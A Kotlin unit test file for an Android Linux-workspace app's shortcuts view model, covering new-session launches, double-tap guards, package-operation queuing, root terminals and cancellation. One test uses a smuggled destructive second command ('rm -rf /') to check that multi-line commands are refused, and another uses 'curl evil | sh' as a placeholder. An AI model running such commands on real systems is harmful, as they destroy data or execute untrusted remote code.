package com.fem.linexa.ui.screens.workspace

import com.fem.linexa.service.runtime.WorkspaceHealthRegistry
import com.fem.linexa.data.Shortcut
import com.fem.linexa.domain.terminal.TerminalWindowIdentityRegistry
import com.fem.linexa.service.runtime.RuntimeBinder
import com.fem.linexa.service.runtime.RuntimeTrace
import com.fem.linexa.service.runtime.SessionManager
import com.fem.linexa.service.runtime.WorkspaceFileManager
import com.fem.linexa.service.runtime.WorkspaceTerminalManager
import com.fem.linexa.domain.runtime.CommandResult
import com.fem.linexa.service.runtime.container.ContainerRuntime
import com.fem.linexa.service.runtime.container.RecoverySweepReport
import com.fem.linexa.service.runtime.features.RecordingGuestFeatureHost
import com.fem.linexa.service.runtime.pty.PtyEvent
import com.fem.linexa.service.runtime.pty.PtySession
import java.io.File
import kotlinx.coroutines.CompletableDeferred
import androidx.lifecycle.viewModelScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.cancel
import kotlinx.coroutines.cancelAndJoin
import kotlinx.coroutines.ExperimentalCoroutinesApi
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.runBlocking
import kotlinx.coroutines.test.StandardTestDispatcher
import kotlinx.coroutines.test.TestDispatcher
import kotlinx.coroutines.test.resetMain
import kotlinx.coroutines.test.setMain
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.mockito.ArgumentMatchers.anyString
import org.mockito.Mockito

/**
 * UI/UX Phase 5C (corrected) — [ShortcutsViewModel]'s two execution paths.
 *
 * The requirement being pinned here is that tapping a leaf command **creates a
 * new terminal session and runs the command in it**, rather than executing inside
 * the card. Everything about that is invisible when wrong in a way a screenshot
 * cannot catch: sending to the *current* session looks identical on the card and
 * only corrupts whatever that shell was doing, and a double tap that opens two
 * sessions leaves one of them silently running the command twice.
 *
 * Tested against a real [RuntimeBinder] + [WorkspaceTerminalManager] over a
 * recording [ContainerRuntime] (the same harness shape as
 * `TerminalsViewModelTest`), so the §9.1 id allocator and the manager's session
 * registration are the real ones — the point of the change is that it reuses that
 * infrastructure instead of starting a second one.
 */
@OptIn(ExperimentalCoroutinesApi::class)
class ShortcutsViewModelTest {

    private lateinit var dispatcher: TestDispatcher
    private lateinit var runtime: RecordingContainerRuntime
    private lateinit var manager: WorkspaceTerminalManager
    private lateinit var binder: RuntimeBinder

    @Before
    fun setUp() {
        dispatcher = StandardTestDispatcher()
        Dispatchers.setMain(dispatcher)
        runtime = RecordingContainerRuntime()
        manager = WorkspaceTerminalManager(runtime, RuntimeTrace())
        val fileManager = Mockito.mock(WorkspaceFileManager::class.java)
        Mockito.`when`(fileManager.getRootfsPath(anyString())).thenReturn(File("/tmp/rootfs"))
        binder = RuntimeBinder(
            sessionManager = Mockito.mock(SessionManager::class.java),
            containerRuntime = runtime,
            fileManager = fileManager,
            workspaceTerminalManager = manager,
            guestFeatureHost = RecordingGuestFeatureHost(),
            events = MutableSharedFlow(),
            healthRegistry = WorkspaceHealthRegistry()
        )
    }

    // Test-isolation fix (2026-09-03): see HomeViewModelEnrichmentTest — cancel
    // leaked ViewModel scopes BEFORE resetMain so their Main-dispatcher
    // resumptions cannot hit the missing-Main fatal and poison the next
    // test class's setMain check.
    private val createdScopes = mutableListOf<kotlinx.coroutines.Job>()

    @After
    fun tearDown() {
        runBlocking { createdScopes.forEach { it.cancelAndJoin() } }
        Dispatchers.resetMain()
    }

    private fun attached(
        identities: TerminalWindowIdentityRegistry = TerminalWindowIdentityRegistry()
    ): ShortcutsViewModel = ShortcutsViewModel(identities).apply {
        attachBinder(WORKSPACE, binder)
        createdScopes += viewModelScope.coroutineContext[kotlinx.coroutines.Job]!!
    }

    // Issue #2 (2026-09-03): the DEFAULT leaf command is a NON-package
    // command — the terminal tier. Package-operation leaves have their own
    // routing (and their own tests below).
    private fun shortcut(
        id: String = "info",
        title: String = "A>B>Info",
        command: String? = "uname -a",
        asRoot: Boolean = false
    ) = Shortcut(
        id = id,
        title = title,
        description = command ?: "",
        iconRes = 0,
        command = command,
        asRoot = asRoot
    )

    private fun packageShortcut(
        id: String = "install",
        command: String = "apt-get install -y krita"
    ) = shortcut(id = id, command = command)

    // ── a leaf runs in a NEW terminal session ─────────────────────────────────

    @Test
    fun tappingALeafOpensANewSessionAndRunsTheCommandInIt() = runBlocking {
        val vm = attached()

        vm.launch(shortcut(command = "htop"))
        dispatcher.scheduler.advanceUntilIdle()

        // A session was opened through the existing runtime path…
        assertEquals(1, runtime.openTerminalCalls)
        val session = runtime.sessions.values.single()
        // …and the command was written to *that* session's pty, newline included
        // (the newline is the Enter key — without it the command sits on the
        // prompt unexecuted).
        assertEquals(listOf("htop\n"), session.writes)
        // The card reports the hand-off and names the session, which is the only
        // trace of where the command went once the overlay is dismissed.
        val state = vm.runStates.value.getValue("info")
        assertTrue("expected Launched, got $state", state is ShortcutRunState.Launched)
        assertEquals("T0", (state as ShortcutRunState.Launched).terminalId)
    }

    @Test
    fun theSessionIsFocusedOnlyAfterTheCommandWasActuallySent() = runBlocking {
        val vm = attached()
        assertNull("nothing to focus before a launch", vm.launchedTerminal.value)

        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()

        // The UI opens the overlay on this id. Published after the write, so the
        // overlay never opens onto a session that turned out not to run anything.
        assertEquals("T0", vm.launchedTerminal.value)
        assertTrue(runtime.sessions.values.single().writes.isNotEmpty())

        vm.consumeLaunchedTerminal()
        assertNull("the focus signal is one-shot", vm.launchedTerminal.value)
    }

    @Test
    fun aNewSessionIsAllocatedRatherThanReusingTheLiveOne() = runBlocking {
        // The workspace's launch terminal (T0) already exists, as it always does
        // in practice. A command must never be typed into it: that shell may be
        // mid-command, inside a pager, or holding a half-typed line.
        val t0 = manager.openTerminal(WORKSPACE, "/tmp/rootfs", "T0", asRoot = false) as RecordingPtySession

        val vm = attached()
        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals("T1", (vm.runStates.value.getValue("info") as ShortcutRunState.Launched).terminalId)
        assertTrue("the live session must receive nothing", t0.writes.isEmpty())
        assertEquals(listOf("uname -a\n"), runtime.session(WORKSPACE, "T1")!!.writes)
    }

    @Test
    fun eachLaunchGetsItsOwnSession() = runBlocking {
        val vm = attached()

        vm.launch(shortcut(id = "a", command = "first"))
        dispatcher.scheduler.advanceUntilIdle()
        vm.launch(shortcut(id = "b", command = "second"))
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals(2, runtime.openTerminalCalls)
        assertEquals(listOf("first\n"), runtime.session(WORKSPACE, "T0")!!.writes)
        assertEquals(listOf("second\n"), runtime.session(WORKSPACE, "T1")!!.writes)
        assertNotEquals(
            (vm.runStates.value.getValue("a") as ShortcutRunState.Launched).terminalId,
            (vm.runStates.value.getValue("b") as ShortcutRunState.Launched).terminalId
        )
    }

    @Test
    fun aDoubleTapCannotOpenTwoSessionsForOneCommand() = runBlocking {
        val vm = attached()

        vm.launch(shortcut())
        vm.launch(shortcut())
        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals("one logical action → one session", 1, runtime.openTerminalCalls)
        assertEquals(1, runtime.sessions.values.single().writes.size)
    }

    @Test
    fun aCommandlessNodeLaunchesNothing() = runBlocking {
        // Unreachable through the tree (a category carries no Shortcut at all),
        // so this is a guard rather than a live branch — but a silent no-op is the
        // only acceptable outcome if one ever gets here.
        val vm = attached()

        vm.launch(shortcut(command = null))
        vm.launch(shortcut(command = "   "))
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals(0, runtime.openTerminalCalls)
        assertTrue(vm.runStates.value.isEmpty())
    }

    @Test
    fun aMultiLineCommandIsRefusedRatherThanWrittenToAShell() = runBlocking {
        // Both metadata paths already guarantee single-line commands so a card can
        // show the whole thing before the user consents (§1.120(c) rejects the
        // entry, §1.122 skips the leaf). Re-checked at the point of use because
        // here an embedded newline would be a *second command* the card never
        // displayed.
        val vm = attached()

        vm.launch(shortcut(command = "echo ok\nrm -rf /"))
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals("no session may be opened for it", 0, runtime.openTerminalCalls)
        assertTrue(vm.runStates.value.getValue("info") is ShortcutRunState.Failed)
    }

    // ── Issue #2 (2026-09-03): package-operation leaves go through the ONE queue ──

    @Test
    fun aPackageOperationLeafRunsThroughTheQueueInsteadOfATerminal() = runBlocking {
        val vm = attached()

        vm.launch(packageShortcut(command = "apt-get install -y krita"))
        dispatcher.scheduler.advanceUntilIdle()

        // NO session: the command ran through execCommandStreaming (the same
        // bridge the Package Manager uses — the runtime serializes it).
        assertEquals("package ops must not open a terminal", 0, runtime.openTerminalCalls)
        assertEquals(listOf("apt-get install -y krita"), runtime.execCommands)
        val state = vm.runStates.value.getValue("install")
        assertTrue("expected Done, got $state", state is ShortcutRunState.Done)
        assertTrue((state as ShortcutRunState.Done).success)
    }

    @Test
    fun twoPackageLeavesSerializeThroughTheQueue() = runBlocking {
        val vm = attached()
        vm.launch(packageShortcut(id = "p1", command = "apt-get update"))
        dispatcher.scheduler.advanceUntilIdle()
        vm.launch(packageShortcut(id = "p2", command = "apt-get upgrade -y"))
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals(0, runtime.openTerminalCalls)
        assertTrue(vm.runStates.value.getValue("p1") is ShortcutRunState.Done)
        assertTrue(vm.runStates.value.getValue("p2") is ShortcutRunState.Done)
    }

    // ── 2026-09-05: per-key run isolation (the "commands do nothing" report) ──

    @Test
    fun aSecondPackageCommandDoesNotCancelTheFirstRun() = runBlocking {
        // The OLD shared-runJob shape: starting p2 cancelled p1's collector
        // mid-flight, p1's card stayed Running forever, and p1's per-key
        // Running guard then blocked every later tap of p1 ("does nothing").
        // The gate proves the fixed behavior: p1 must STILL be running while
        // p2 starts, and must complete when released.
        val vm = attached()
        runtime.execGates["apt-get update"] = CompletableDeferred()

        vm.launch(packageShortcut(id = "p1", command = "apt-get update"))
        dispatcher.scheduler.advanceUntilIdle()
        assertTrue("p1 must be in flight under the gate",
            vm.runStates.value.getValue("p1") is ShortcutRunState.Running)

        vm.launch(packageShortcut(id = "p2", command = "apt-get upgrade -y"))
        dispatcher.scheduler.advanceUntilIdle()

        assertTrue("p2 must complete while p1 is still running",
            vm.runStates.value.getValue("p2") is ShortcutRunState.Done)
        assertTrue("p1 must NOT have been cancelled by p2's start",
            vm.runStates.value.getValue("p1") is ShortcutRunState.Running)

        runtime.execGates["apt-get update"]?.complete(Unit)
        dispatcher.scheduler.advanceUntilIdle()
        assertTrue("p1 must complete once its run finishes",
            vm.runStates.value.getValue("p1") is ShortcutRunState.Done)
    }

    @Test
    fun aSameKeyDoubleTapWhileRunningIsStillIgnored() = runBlocking {
        val vm = attached()
        runtime.execGates["apt-get update"] = CompletableDeferred()

        vm.launch(packageShortcut(id = "p1", command = "apt-get update"))
        dispatcher.scheduler.advanceUntilIdle()
        vm.launch(packageShortcut(id = "p1", command = "apt-get update"))
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals("one logical command → one exec", 1, runtime.execCommands.size)
        runtime.execGates["apt-get update"]?.complete(Unit)
        dispatcher.scheduler.advanceUntilIdle()
    }

    @Test
    fun aCompletedRunFreesItsKeyForTheNextTap() = runBlocking {
        val vm = attached()
        vm.launch(packageShortcut(id = "p1", command = "apt-get update"))
        dispatcher.scheduler.advanceUntilIdle()
        assertTrue(vm.runStates.value.getValue("p1") is ShortcutRunState.Done)

        // The job slot was freed in finally — a completed run must never
        // block the same command's next run.
        vm.launch(packageShortcut(id = "p1", command = "apt-get update"))
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals(2, runtime.execCommands.size)
        assertTrue(vm.runStates.value.getValue("p1") is ShortcutRunState.Done)
    }

    @Test
    fun aCancelledTerminalLaunchLeavesNoBogusFailedState() = runBlocking {
        // U5/M-2 parity for the terminal tiers: cancelling the scope while
        // the open is in flight must NOT write a Failed row (a cancelled run
        // is not a result). The old catch (Exception) did exactly that.
        val vm = attached()
        runtime.openGate = CompletableDeferred()
        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()
        assertTrue(vm.runStates.value.getValue("info") is ShortcutRunState.Opening)

        vm.viewModelScope.cancel()
        dispatcher.scheduler.advanceUntilIdle()

        val state = vm.runStates.value["info"]
        assertTrue(
            "a cancelled launch must not surface as Failed (got $state)",
            state is ShortcutRunState.Opening
        )
    }

    @Test
    fun aPlainLeafCommandIsNotClassifiedAsAPackageOperation() = runBlocking {
        val vm = attached()
        vm.launch(shortcut(command = "aptitude --help")) // 'aptitude' ≠ 'apt'
        dispatcher.scheduler.advanceUntilIdle()
        assertEquals("aptitude is not a mutating package manager binary", 1, runtime.openTerminalCalls)
    }

    // ── Issue #1 (2026-09-03): as_root leaves open the ROOT terminal ──────

    @Test
    fun anAsRootLeafOpensTheRootTerminal() = runBlocking {
        val vm = attached()

        vm.launch(shortcut(id = "rootsh", command = null, asRoot = true))
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals(1, runtime.openTerminalCalls)
        assertTrue("the root session must be recorded as opened", runtime.asRootOpens.isNotEmpty())
        assertTrue(runtime.asRootOpens.single())
        assertNull("a bare root shell writes nothing", runtime.sessions.values.single().writes.takeIf { it.isNotEmpty() })
        assertTrue(vm.runStates.value.getValue("rootsh") is ShortcutRunState.Launched)
    }

    @Test
    fun anAsRootLeafWithACommandWritesItToTheRootSession() = runBlocking {
        val vm = attached()

        vm.launch(shortcut(id = "fix", command = "dpkg --configure -a", asRoot = true))
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals(1, runtime.openTerminalCalls)
        assertTrue(runtime.asRootOpens.single())
        assertEquals(listOf("dpkg --configure -a\n"), runtime.sessions.values.single().writes)
    }

    @Test
    fun aLaunchedShortcutRecordsItsTitleAndCommandForTheNewWindow() = runBlocking {
        val identities = TerminalWindowIdentityRegistry()
        val vm = attached(identities)

        vm.launch(shortcut(id = "info", title = "System info", command = "uname -a"))
        dispatcher.scheduler.advanceUntilIdle()

        val identity = identities.get(WORKSPACE, "T0")!!
        assertEquals("System info", identity.title)
        assertEquals("info", identity.appId)
        assertEquals("uname -a", identity.command)
    }

    @Test
    fun aFailedOpenLeavesNoWindowIdentityBehind() = runBlocking {
        runtime.failNextOpen = true
        val identities = TerminalWindowIdentityRegistry()
        val vm = attached(identities)

        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()

        assertNull(identities.get(WORKSPACE, "T0"))
    }

    @Test
    fun aFailedOpenIsReportedAsAFailureAndNotAsARunThatEnded() = runBlocking {
        runtime.failNextOpen = true
        val vm = attached()

        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()

        val state = vm.runStates.value.getValue("info")
        assertTrue("expected Failed, got $state", state is ShortcutRunState.Failed)
        assertNull("nothing to focus when no session opened", vm.launchedTerminal.value)
    }

    @Test
    fun withoutABinderNothingIsLaunched() = runBlocking {
        val vm = ShortcutsViewModel(TerminalWindowIdentityRegistry()).also { createdScopes += it.viewModelScope.coroutineContext[kotlinx.coroutines.Job]!! }

        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals(0, runtime.openTerminalCalls)
        assertTrue(vm.runStates.value.isEmpty())
    }

    @Test
    fun aLeafsLaunchStateIsReplacedByItsNextLaunchRatherThanDismissed() = runBlocking {
        // There is deliberately no `clearLaunchState`: unlike the `+`'s report row,
        // a leaf's status lives on a card that stays on screen, and "it went to T0"
        // remains true for as long as that session exists. Re-tapping is the only
        // way it changes — which must actually replace the id, not append a second
        // entry.
        val vm = attached()
        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()
        assertEquals(
            ShortcutRunState.Launched("T0"),
            vm.runStates.value.getValue("info")
        )

        vm.consumeLaunchedTerminal()
        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals(1, vm.runStates.value.size)
        assertEquals(
            ShortcutRunState.Launched("T1"),
            vm.runStates.value.getValue("info")
        )
    }

    // ── the `+` is unchanged: inline, dismissible, separate from the tree ─────

    @Test
    fun theCustomCommandStillRunsInlineAndReportsItsResult() = runBlocking {
        // Deliberately NOT routed into a new session: it is a one-off the user
        // typed for a quick answer, with no card and no session worth opening.
        runtime.execOutput = "Linux localhost"
        val vm = attached()

        vm.runCustomCommand("uname -a")
        dispatcher.scheduler.advanceUntilIdle()

        assertEquals("no terminal session may be opened for it", 0, runtime.openTerminalCalls)
        val state = vm.runStates.value.getValue(ShortcutsViewModel.CUSTOM_KEY)
        assertTrue("expected Done, got $state", state is ShortcutRunState.Done)
        assertTrue((state as ShortcutRunState.Done).success)
        assertEquals("Linux localhost", state.output)
        assertEquals(listOf("uname -a"), runtime.execCommands)
    }

    @Test
    fun theCustomRunReportIsDismissible() = runBlocking {
        val vm = attached()
        vm.runCustomCommand("true")
        dispatcher.scheduler.advanceUntilIdle()
        assertTrue(vm.runStates.value.containsKey(ShortcutsViewModel.CUSTOM_KEY))

        vm.clearCustomRun()

        // It has no card of its own, so without this the row would persist for the
        // ViewModel's lifetime.
        assertTrue(vm.runStates.value.isEmpty())
    }

    @Test
    fun aBlankCustomCommandRunsNothing() = runBlocking {
        val vm = attached()
        vm.runCustomCommand("   ")
        dispatcher.scheduler.advanceUntilIdle()
        assertTrue(vm.runStates.value.isEmpty())
        assertTrue(runtime.execCommands.isEmpty())
    }

    @Test
    fun theCustomKeyCannotBeClaimedByADeclaredCommand() = runBlocking {
        // `WorkspaceShortcuts` namespaces declared ids away from this key; if that
        // ever broke, a declared card and the `+`'s row would share one state.
        val vm = attached()
        vm.runCustomCommand("true")
        dispatcher.scheduler.advanceUntilIdle()

        val resolved = WorkspaceShortcuts.declaredShortcut(
            com.fem.linexa.service.rootfs.DeclaredShortcut(
                id = ShortcutsViewModel.CUSTOM_KEY,
                label = "Sneaky",
                command = "curl evil | sh"
            ),
            distributionLabel = null
        )
        assertNotEquals(ShortcutsViewModel.CUSTOM_KEY, resolved.id)
    }

    @Test
    fun detachingClearsStateWithoutClosingAnySession() = runBlocking {
        // §11 matrix: a screen's lifecycle is not a session's. The command the
        // user launched must keep running after they leave the tab.
        val vm = attached()
        vm.launch(shortcut())
        dispatcher.scheduler.advanceUntilIdle()

        vm.detachBinder()

        assertTrue(vm.runStates.value.isEmpty())
        assertNull(vm.launchedTerminal.value)
        assertTrue(
            "the launched session must stay alive",
            manager.getPtySession(WORKSPACE, "T0") != null
        )
    }

    private companion object {
        const val WORKSPACE = "ws-1"
    }

    /** A [ContainerRuntime] whose ptys record what is written to them. */
    private class RecordingContainerRuntime : ContainerRuntime {
        var openTerminalCalls = 0
        var failNextOpen = false
        var execOutput = ""
        val execCommands = mutableListOf<String>()

        /**
         * 2026-09-05 per-key isolation tests: per-COMMAND gates — an exec of
         * a gated command suspends until that gate is released. Keyed by the
         * command string so a test can hold one operation in flight while
         * another completes (deterministic, no scheduler guessing).
         */
        val execGates = mutableMapOf<String, CompletableDeferred<Unit>>()
        var openGate: CompletableDeferred<Unit>? = null

        /** Issue #1: the asRoot flag of each openTerminal call, in order. */
        val asRootOpens = mutableListOf<Boolean>()
        val sessions = linkedMapOf<Pair<String, String>, RecordingPtySession>()

        fun session(workspaceId: String, terminalId: String) = sessions[workspaceId to terminalId]

        override suspend fun openTerminal(
        workspaceId: String,
        rootfsPath: String,
        terminalId: String,
        asRoot: Boolean
    ): PtySession {
            openGate?.await()
            if (failNextOpen) {
                failNextOpen = false
                throw IllegalStateException("proot unavailable")
            }
            openTerminalCalls++
            asRootOpens += asRoot
            val pty = RecordingPtySession(
                id = "pty-$openTerminalCalls",
                workspaceId = workspaceId,
                pid = 2000 + openTerminalCalls
            )
            sessions[workspaceId to terminalId] = pty
            return pty
        }

        override fun getTerminal(workspaceId: String, terminalId: String): PtySession? =
            sessions[workspaceId to terminalId]

        override fun isTerminalAlive(workspaceId: String, terminalId: String): Boolean =
            sessions.containsKey(workspaceId to terminalId)

        override suspend fun closeTerminal(workspaceId: String, terminalId: String) {
            sessions.remove(workspaceId to terminalId)
        }

        override suspend fun closeWorkspaceSessions(workspaceId: String) {
            sessions.keys.removeAll { it.first == workspaceId }
        }

        override suspend fun exec(workspaceId: String, rootfsPath: String, command: String): CommandResult {
            execCommands += command
            return CommandResult(exitCode = 0, output = execOutput)
        }

        override suspend fun execWithInput(
            workspaceId: String,
            rootfsPath: String,
            command: String,
            stdin: String
        ): CommandResult = exec(workspaceId, rootfsPath, command)

        override suspend fun execStreaming(
            workspaceId: String,
            rootfsPath: String,
            command: String,
            timeoutSeconds: Long,
            onLine: (String) -> Unit
        ): CommandResult {
            execCommands += command
            execGates[command]?.await()
            if (execOutput.isNotEmpty()) onLine(execOutput)
            return CommandResult(exitCode = 0, output = execOutput)
        }

        override suspend fun startDaemon(
            workspaceId: String,
            rootfsPath: String,
            name: String,
            command: String
        ): Boolean = false

        override suspend fun stopDaemon(workspaceId: String, name: String) = Unit

        override fun isDaemonAlive(workspaceId: String, name: String): Boolean = false

        override suspend fun stopAllDaemons(workspaceId: String) = Unit

        override suspend fun startupRecoverySweep(): RecoverySweepReport = RecoverySweepReport(0, 0, 0)
    }

    /**
     * A [PtySession] that records writes, so a test can assert *which* session a
     * command was sent to — the whole point of the corrected flow.
     */
    private class RecordingPtySession(
        override val id: String,
        override val workspaceId: String,
        override val pid: Int
    ) : PtySession {
        val writes = mutableListOf<String>()
        private val exitSignal = CompletableDeferred<Int>()

        override val isAlive: Boolean get() = !exitSignal.isCompleted
        override val exitCode: Int? get() = if (exitSignal.isCompleted) exitSignal.getCompleted() else null
        private val _events = MutableSharedFlow<PtyEvent>()
        override val events: SharedFlow<PtyEvent> = _events
        override fun write(data: ByteArray) {
            writes += String(data)
        }

        override fun write(text: String) {
            writes += text
        }

        override fun resize(columns: Int, rows: Int) = Unit
        override fun currentTranscript(): String = ""
        override fun recentOutput(maxChars: Int): String = ""
        override suspend fun awaitExit(): Int = exitSignal.await()
        override fun destroy() = Unit
    }
}
